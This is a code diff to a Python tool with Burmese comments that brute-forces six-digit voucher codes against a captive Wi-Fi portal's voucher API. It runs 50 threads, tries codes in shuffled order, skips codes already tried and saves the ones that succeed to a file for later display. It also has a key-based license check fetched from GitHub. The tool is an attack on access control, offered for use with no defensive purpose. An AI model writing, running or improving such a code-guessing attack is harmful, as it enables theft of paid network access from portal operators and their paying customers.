@@ -3,6 +3,7 @@ import re
 import urllib3
 import time
 import threading
+import random # --- RANDOM အတွက် ထည့်ထားသည် ---
 from datetime import datetime, timedelta
 import sys
 import os
@@ -15,7 +16,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # --- CONFIGURATION ---
 KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
 TRIED_CODES_FILE = "tried_codes.txt"
-# Thread အရေအတွက်တိုးရင် ပိုမြန်မည် (အင်တာနက်ပေါ်မူတည်သည်)
+SUCCESS_CODES_FILE = "success.txt"
 VOUCHER_THREADS = 50 
 
 # --- CLEAR SCREEN FUNCTION ---
@@ -31,6 +32,10 @@ def load_tried_codes():
 
 def save_tried_code(code):
     with open(TRIED_CODES_FILE, "a") as f:
+        f.write(f"{code}\n")
+
+def save_success_code(code):
+    with open(SUCCESS_CODES_FILE, "a") as f:
         f.write(f"{code}\n")
 
 # --- TOKEN LICENSE SYSTEM ---
@@ -88,13 +93,13 @@ def show_menu():
     print("         🛠️  MAIN MENU                ")
     print("========================================")
     print("1. 🌐 Internet Access")
-    print("2. 🔍 Fast Voucher Harvesting")
+    print("2. 🔍 Fast Random Voucher Harvesting")
     print("3. 📋 View Success Codes")
     print("========================================\n")
     choice = input("👉 ရွေးချယ်ပါ (1-3): ")
     return choice
 
-# --- FAST VOUCHER HARVESTING LOGIC ---
+# --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
 def test_code(code, portal_host, sid, session):
     """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
     voucher_api = f"{portal_host}/api/auth/voucher/"
@@ -103,14 +108,16 @@ def test_code(code, portal_host, sid, session):
         v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
         if v_res.status_code == 200 and "success" in v_res.text.lower():
-            # SUCCESS အစိမ်းရောင်
+            # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
             print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
             save_tried_code(code)
+            save_success_code(code)
             return True
     except:
         pass
     
     save_tried_code(code)
+    # Fail ဖြစ်ပါက ဘာမှမပြဘဲနေမည် (Silent)
     return False
 
 def start_voucher_harvesting():
@@ -118,15 +125,19 @@ def start_voucher_harvesting():
     tried_codes = load_tried_codes()
     print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
 
-    # အမှန်တကယ်တွင် portal_host နှင့် sid ကို Portal ကယူရမည်
-    portal_host = "http://192.168.60.1" # Example
-    sid = "example_session_id" # Example
+    # Example placeholders
+    portal_host = "http://192.168.60.1" 
+    sid = "example_session_id"
     session = requests.Session()
 
     threads = []
     
-    for i in range(1000000):
-        code = f"{i:06d}"
+    # 000000 ကနေ 999999 ထိ Random ယူမည်
+    all_codes = list(range(1000000))
+    random.shuffle(all_codes) # --- RANDOM လုပ်ခြင်း ---
+
+    for code_int in all_codes:
+        code = f"{code_int:06d}"
         if code in tried_codes:
             continue
         
@@ -141,7 +152,7 @@ def start_voucher_harvesting():
                 t.join()
             threads = []
             
-        print(f"\r🔍 စမ်းသပ်နေသည်: {code}", end="", flush=True)
+        print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)
 
 # --- MAIN RUNNER ---
 if __name__ == "__main__":
@@ -152,8 +163,12 @@ if __name__ == "__main__":
         elif choice == '2':
             start_voucher_harvesting()
         elif choice == '3':
-            print("\n📋 Access Code များ:")
-            # Logic to display success codes
+            print("\n📋 Success Code များ:")
+            if os.path.exists(SUCCESS_CODES_FILE):
+                with open(SUCCESS_CODES_FILE, "r") as f:
+                    print(f.read())
+            else:
+                print("No success codes found.")
             time.sleep(5)
         else:
             print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
